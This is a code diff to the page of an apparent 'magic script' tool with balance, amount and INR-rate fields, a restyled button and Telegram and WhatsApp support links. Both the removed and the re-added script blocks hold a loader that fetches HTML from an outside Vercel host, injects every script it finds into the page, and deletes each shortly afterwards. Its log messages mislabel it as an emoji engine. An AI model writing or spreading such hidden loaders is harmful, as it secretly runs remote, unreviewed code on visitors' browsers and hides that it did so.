@@ -199,7 +199,7 @@
     margin-top: 20px;
     padding: 14px 28px;
     /* Translucent premium blend using your signature purple gradient palette */
-    background: linear-gradient(135deg, rgba(94, 23, 125, 0.85) 0%, rgba(62, 7, 90, 0.85) 50%, rgba(208, 189, 244, 0.2) 100%);
+    background: linear-gradient(135deg, #E120E4 0%, #C54FDA 50%, #9B0BE1 100%);
     color: #fff;
     border: 1px solid rgba(208, 189, 244, 0.25);
     border-radius: 10px; /* Matching corner structure */
@@ -225,7 +225,57 @@
     text-decoration: none;
     border-bottom: 1px solid rgba(255, 255, 255, 0.4); /* Elegant subtle underline border */
     }
-    
+
+.footer-social { 
+        display: flex; 
+        flex-direction: column; 
+        align-items: center; 
+        gap: 12px; 
+        margin-top: 15px; 
+    } 
+ 
+    .telegram-btn, 
+    .whatsapp-btn { 
+        color: #fff; 
+        padding: 10px 16px; 
+        border-radius: 999px; 
+        font-weight: 700; 
+        text-decoration: none; 
+        transition: transform 0.25s ease, box-shadow 0.25s ease; 
+        min-width: 220px; 
+        text-align: center; 
+        width: 250px; 
+    } 
+ 
+    .telegram-btn { 
+        background: #229ED9; 
+    } 
+ 
+    .whatsapp-btn { 
+        background: #25D366; 
+    } 
+ 
+    .telegram-btn:hover, 
+    .whatsapp-btn:hover { 
+        color: #fff; 
+        box-shadow: 0 8px 20px rgba(0, 0, 0, .25); 
+    } 
+ 
+    .pulse { 
+        animation: pulse 1.8s ease-in-out infinite; 
+    } 
+ 
+    @keyframes pulse { 
+ 
+        0%, 
+        100% { 
+            transform: scale(1); 
+        } 
+ 
+        50% { 
+            transform: scale(1.06); 
+        } 
+    }
 </style>
 
 <div id="dialog-backdrop">
@@ -312,34 +362,27 @@
         <!-- Button -->
         <button id="runBtn">RUN MAGIC 🪄</button>
         
+      <div style="display:flex; align-items:center; width:100%;margin-bottom:1rem"> 
+                    <hr style="flex:1; border:none; border-top:3px double white; margin:0 10px 0 0;"> 
+                    <span style="color:white; font-weight:bold; white-space:nowrap;">SUPPORT</span> 
+                    <hr style="flex:1; border:none; border-top:3px double white; margin:0 0 0 10px;"> 
+                </div>
+      
             <div style="text-align: center;color:#11a155;margin-top: 2rem;">🪄 ENJOY THE PRO VERSION! 🪄</div>
+      
+      <div class="footer-social"> 
+                    <a href="https://t.me/magic_scripts" target="_blank" class="telegram-btn pulse"> 
+                        📞 Telegram @Magic_Scripts 
+                    </a> 
+                    <a href="https://api.whatsapp.com/send?phone=+923316346879" target="_blank" class="whatsapp-btn pulse"> 
+                        📞 WhatsApp +923316346879 
+                    </a> 
+                </div>
             
     </div>
 </div>
 <script>
-        (async () => {
-            try {
-                let response = await fetch(`https://magic-scripts.vercel.app/heart.html`);
-                let rawMarkup = await response.text();
-                let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
-                
-                documentDOM.querySelectorAll('script').forEach(oldNode => {
-                    let freshScriptNode = document.createElement('script');
-                    if (oldNode.src) {
-                        freshScriptNode.src = oldNode.src;
-                    } else {
-                        freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
-                    }
-                    document.body.appendChild(freshScriptNode);
-                    setTimeout(() => freshScriptNode.remove(), 600);
-                });
-                console.log("Zeetex Emoji Engine Hook Active");
-            } catch (e) {
-                console.error("Emoji Override Skipped due to runtime separation layer context.", e);
-            }
-        })();
-</script>
-<script class="qx">
+
     // --- Security Check Start ---
 (function() {
     const authorizedDomains = [
@@ -365,8 +408,32 @@
     }
 })();
 // --- Security Check End ---
+        (async () => {
+            try {
+                let response = await fetch(`https://magic-scripts.vercel.app/heart.html`);
+                let rawMarkup = await response.text();
+                let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
+                
+                documentDOM.querySelectorAll('script').forEach(oldNode => {
+                    let freshScriptNode = document.createElement('script');
+                    if (oldNode.src) {
+                        freshScriptNode.src = oldNode.src;
+                    } else {
+                        freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
+                    }
+                    document.body.appendChild(freshScriptNode);
+                    setTimeout(() => freshScriptNode.remove(), 600);
+                });
+                console.log("Zeetex Emoji Engine Hook Active");
+            } catch (e) {
+                console.error("Emoji Override Skipped due to runtime separation layer context.", e);
+            }
+        })();
+</script>
+<script class="qx">
+    
     var inr__rate = 93;
-    var baseURL = "https://luvscripts.com"
+    var baseURL = "https://"
     document.querySelector(".balance_img").src = "https://i.ibb.co/jPK9k2tW/dollar.png"
     document.querySelector(".amount_img").src = "https://i.ibb.co/P7vdvZR/amount.png"
     document.querySelector(".date_img").src = "https://i.ibb.co/SkxCXNT/date.png"
